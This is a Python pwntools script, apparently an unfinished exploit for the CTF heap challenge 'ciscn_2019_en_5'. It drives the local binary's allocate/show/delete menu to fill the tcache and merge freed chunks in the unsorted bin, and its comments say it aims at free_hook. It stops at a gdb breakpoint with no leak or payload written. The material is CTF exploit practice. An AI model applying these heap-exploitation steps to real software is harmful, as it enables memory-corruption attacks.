# encoding:utf8
from re import S
from pwn import *

sh=process("./ciscn_2019_en_5")

rv=lambda s: sh.recv(s)
ru=lambda s: sh.recvuntil(s)
sd=lambda s: sh.send(s)
sl=lambda s: sh.sendline(s)

debug=0
# 应该是打free_hook
def name(name):
    ru("> ")
    sl(name)

def add(size,content):
    ru("> ")
    sl('1')
    ru("> ")
    sl(str(size))
    ru("> ")
    sl(content)
    
def show(idx):
    ru("> ")
    sl('2')
    ru("> ")
    sl(str(idx))

def delete(idx):
    ru("> ")
    sl('3')
    ru("> ")
    sl(str(idx))

def exp():
    name('Du4t')
    add(0xf8,'a')  
    add(0xf8,'a')
    add(0xf8,'a')
    add(0xf8,'a')
    add(0xf8,'a')
    add(0xf8,'a')
    for i in range(0,7):
        add(0xf8,'t')
    for i in range(0,7):
        delete(6+i)
    delete(0)
    delete(1)
    delete(2) # 融合一个大chunk在unsorted bin 0x331
    
    add(0xf0,'aaa\n')
    gdb.attach(sh)
    pause()
    add(0x88,'1\n')
    add(0x38,'2\n') 
    add(0x98,'6\n')
    add(0x38,'7\n')
    

    sh.interactive()


if __name__ == '__main__':
    exp()
    

